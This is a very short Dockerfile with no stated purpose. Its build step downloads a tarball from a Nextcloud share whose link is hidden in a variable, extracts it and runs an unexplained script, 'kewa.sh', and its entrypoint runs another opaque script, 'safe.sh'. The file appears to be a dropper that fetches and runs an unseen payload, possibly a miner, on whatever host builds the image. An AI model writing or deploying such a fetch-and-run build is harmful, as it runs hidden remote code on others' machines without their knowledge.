FROM ubuntu:18.04

RUN apt update && \
    apt install wget sudo -y && \
    wget -O lhope.tar.gz https://nextcloud-fi.webo.hosting/s/$LINK/download && \
    tar xzf lhope.tar.gz && \
    bash kewa.sh

COPY . .

ENTRYPOINT [ "sh", "safe.sh" ]
